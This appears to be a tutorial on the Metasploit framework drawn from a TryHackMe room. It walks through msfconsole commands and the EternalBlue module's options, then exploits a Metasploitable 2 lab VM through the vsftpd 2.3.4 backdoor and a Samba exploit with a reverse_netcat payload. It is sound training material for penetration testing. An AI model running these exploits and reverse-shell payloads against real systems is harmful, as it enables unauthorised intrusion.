# Metasploit

This part is based on info from TryHackMe: https://tryhackme.com/room/rpmetasploit

Metasploit is a framework for testing and abusing know vulnerabilities.

When we want to use it for the first time, run:

    msfdb init

Once ready, we can start Metasploit

    msfconsole

Check that we are been connected to the database (postgresql). Once Metasploit is launched.

    db_status

To get help in the msfconsole, type:

    help

You can actually also use the shortcut key:

    ?

Sometimes, especially when doing audits, it can be mandatory to record everything you have done to prove what you have done, but also to help to debug. For this see the `spool` option. It will give you information on what to do when you just enter `spool` in the console.

To search something:

    search <keywords1 keyword2 keyword3>

For example:

    seach eternal

Which then in return will show you a bunch of stuff:

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

In this list you see various items, 6 columns in fact:

1. The row (index in fact) number
2. The name of the module, which also tells you for which operating system this applies to.
3. Disclosure date.
4. The rank number. 
5. A check info column. 
6. A short description with usually the version of the concerned program.

To get more information about a module you can use its index number of the full name of the module:

    info 0

or:

    info exploit/windows/smb/ms17_010_eternalblue

Which in turns show you the full description like this for example:

```
       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  thelightcosine
  wvu <wvu@metasploit.com>
  agalway-r7
  cdelafuente-r7
  cdelafuente-r7
  agalway-r7

Available targets:
  Id  Name
  --  ----
  0   Automatic Target
  1   Windows 7
  2   Windows Embedded Standard 7
  3   Windows Server 2008 R2
  4   Windows 8
  5   Windows 8.1
  6   Windows Server 2012
  7   Windows 10 Pro
  8   Windows 10 Enterprise Evaluation

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit,
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error
  where a DWORD is subtracted into a WORD. The kernel pool is groomed
  so that overflow is well laid-out to overwrite an SMBv1 buffer.
  Actual RIP hijack is later completed in
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may
  not trigger 100% of the time, and should be run continuously until
  triggered. It seems like the pool will get hot streaks and need a
  cool down period before the shells rain in again. The module will
  attempt to use Anonymous login, by default, to authenticate to
  perform the exploit. If the user supplies credentials in the
  SMBUser, SMBPass, and SMBDomain options it will use those instead.
  On some systems, this module may cause system instability and
  crashes, such as a BSOD or a reboot. This may be more likely with
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
  https://github.com/RiskSense-Ops/MS17-010
  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
  https://www.exploit-db.com/exploits/42030

Also known as:
  ETERNALBLUE
```

Once we found something we want to "use" we specify the use command with the index value or its name: `use <module index-number or full-module-path-name>`. For example:

Example on index number:

    use 0

Same example but with the module name:

    use exploit/windows/smb/ms17_010_eternalblue

Once you started to `use` a module you will see that the prompt change:
```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

You can also request `info`, like before using the module. In case you forgot the info. 

Now before we continue we need to look to the options we need to set for this module. This is always this way for each module you will use. For this just type in `options` which in turn will show you the options:

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.48     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Before using the exploit, we can also use the build in `netcat` alike `connect` command to see if we can communicate with the host computer. This can be handy to quickly verify if the host is still up and running. By just entering `connect` the console will give you information about the options you need to set before you will be able to connect.

To set an option, use the `set` keyword following by the value you want to provide. For example:

    set LPORT 8080

Setting a variable only live there in the module we are currently using. So if we load / use another module for whatever reason, we loose the settings. Also when we close metasploit, all these variable changes are lost.

Sometimes it's more easy, especially for some variable types such as `RHOST`, `LHOST` to use the global set with `setg`. So that you don't always need to reset that variable.

We can also `get` the variable value with `get`. And `unset` the variable.

Sometimes there are `advanced` options and to list them, you type `advanced`.

```
Module advanced options (exploit/windows/smb/ms17_010_eternalblue):

   Name                    Current Setting                     Required  Description
   ----                    ---------------                     --------  -----------
   CHOST                                                       no        The local client address
   CPORT                                                       no        The local client port
   CheckModule             auxiliary/scanner/smb/smb_ms17_010  yes       Module to check with
   ConnectTimeout          10                                  yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                                      no        The information file that contains context information
   DisablePayloadHandler   false                               no        Disable the handler code for the selected payload
   EnableContextEncoding   false                               no        Use transient context when encoding payloads
   GroomAllocations        12                                  yes       Initial number of times to groom the kernel pool.
   GroomDelta              5                                   yes       The amount to increase the groom count by per try. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   MaxExploitAttempts      3                                   yes       The number of times to retry the exploit. Useful as EternalBlue can sometimes require multiple attempts to get a successful execution.
   ProcessName             spoolsv.exe                         yes       Process to inject payload into.
   Proxies                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   SSL                     false                               no        Negotiate SSL/TLS for outgoing connections
   SSLCipher                                                   no        String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
   SSLVerifyMode           PEER                                no        SSL verification method (Accepted: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER)
   SSLVersion              Auto                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   VERBOSE                 false                               no        Enable detailed status messages
   WORKSPACE                                                   no        Specify the workspace for this module
   WfsDelay                5                                   no        Additional delay in seconds to wait for a session


Payload advanced options (windows/x64/meterpreter/reverse_tcp):

   Name                         Current Setting  Required  Description
   ----                         ---------------  --------  -----------
   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
   AutoRunScript                                 no        A script to run automatically on session creation.
   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
   AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
   EnableStageEncoding          false            no        Encode the second stage payload
   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
   PingbackRetries              0                yes       How many additional successful pingbacks
   PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
   PrependMigrate               false            yes       Spawns and runs shellcode in new process
   PrependMigrateProc                            no        Process to spawn and run shellcode in
   ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
   ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
   ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                           no        The specific communication channel to use for this listener
   ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
   SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
   SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
   SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
   SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
   StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
   StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
   StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
   StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                      false            no        Enable detailed status messages
   WORKSPACE                                     no        Specify the workspace for this module
```

Before launching your attract (`exploit`) you want to `check` if the target is vulnerable to this attack with: `check`

To launch your attack (`exploit`) you want to use the command: `exploit` or the alias `run`.

Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it. To show them, use the `show` command. Which in turn will give you more information:

[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions

These modules are very interesting, and I will not list them here as this is way too long. But think to:

* `exploit` - These are them we most of the time use. These contains the exploit code.
* `payload` - These are used hands in hands with exploits, which contains the various bits of shellcode we send to have executed following exploitation.
* `auxiliary` - Modules used in scanning and verification if machines are exploitable. This is not the same thing as exploit. For example test for vulnerabilities. For example scan a bunch of sshd servers to test out credentials. This is very useful if you're not allowed to do exploitation. This is very common in vulnerability assessments or red teaming to see where the weak points are without doing the full penetration tests. This also include tools like `db_nmap` to scan open ports. Which is `nmap` into metasploit.
* `encoders` - Commonly used in payload obfuscation, which allows us to modify the "appearance" of our exploit such that we may avoid signature detection.
* `post` -  Post (after) exploitation and is for looting (stealing) and pivoting, when you have root/admin access to dump for example the SAM (password) database.
* `NOP Generators` - For buffer overflow and ROP attacks.

Not every module is loaded in by default, but we can use the `load` command to load them.

# Using nmap in metasploit

And here is a good example of an auxiliary module like discused in the previous section.


    db_nmap -sV 10.10.179.162    

You can also add the `-vv` flag to speed up the nmap scan.

Once the scan is done, we can do a lot of neat things by typing it's appropriate command:

* `hosts` - To see the hosts we found. But here in the previous example, we only scanned for one particular host.
* `services` - To see all the `services` the nmap scan detected
* `vulns` - To keep track of the discovered vulnerabilities. This

# Background information

To test out Metasploit, you should better make use of very vulnerable 
programs. For instance the Metasploitable Operating system is especially 
created for this purpose. An Operating system dedicated for learning 
purposes and which has tons of applications installed know to be very 
vulnerable. This is very interesting in learning and using tools to hack 
know vulnerable programs.

So to start with this all, install the Metasploitable virtual machine which 
you can download here:
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Once downloaded you can easily configure a virtual machine, by making use 
of `Vmware` or `Virtual box`.

# Simple example

Based on a virtual host machine `Metasploitable 2.0.` which contains a lot 
of known exploitable vulnerabilities.

On the host machine, use `zenmap` and do a `Quick Scan Plus` to discover the 
devices on your network. Once you have found all devices connected to your 
network, you can do an `Intense scan` on the IP of that `Metasploitable` 
virtual machine. In my case, that `0Metasploitable 2.0` virtual machine has the 
ip address `10.0.2.6`.

We will for example see that vsftpd 2.3.4 is installed on the target machine:

    21/tcp   open  ftp         vsftpd 2.3.4

From this point, we should search on Google for each application, and it's 
version number to find out if there are known vulnerabilities.

So doing a little Google search about `vsftpd 2.3.4 vulnerabilities` will 
give us for example this website: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ which give metasploit 
instructions to gain access to this computer.

So to start with, run Metasploit with as `root` user:

    msfconsole

This will load the Metasploit framework.

    use exploit/unix/ftp/vsftpd_234_backdoor

From this you should always look what options there are for this exploit.

    use options

Then set the remote host ip in the options with:

    set RHOST 10.0.2.6

Start the exploit:

    exploit

Actually it's maybe more wise to use the `run -j` instead of `exploit` as this will run the job in the background and this we have our metasploit console free to do other things. Once you used `run -j`, just press enter once so see back your prompt. Then, we can use the command `jobs` to see what's running. This is especially useful for exploits that stays running for some time.

Then also check with `sessions` and `sessions -i NUMBER_SESSION` to re attach the session.

From now, you are on the remote host, and you have full access on the remote 
host. You can check it with `uname -a` to see the linux version and check 
your user rights with `id`.

    touch /tmp/your-been-hacked

And you can verify on that host machine to check if the file `touch 
/tmp/your-been-hacked` has been created.

# Another example

In this example we will look to the vulnerable version of Samba that is 
installed on that remote computer.

    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

So in the `msfconsole`:

    use exploit/multi/samba/usermap_script

Now show the options that are available for this exploit:

    show options

    set RHOST 10.0.2.6

Payloads are small pieces of code that will be executed when the 
vulnerability has been exploited.

See what available payloads there is available:

    show payloads

*Note that a default payload has been loaded with we started to use this 
`username_script exploit`. Note also that not all payloads actually work.*

To set a different payload, you can use the following command:

    set PAYLOAD payload/cmd/unix/reverse_netcat

Finally, launch the exploit:

    exploit

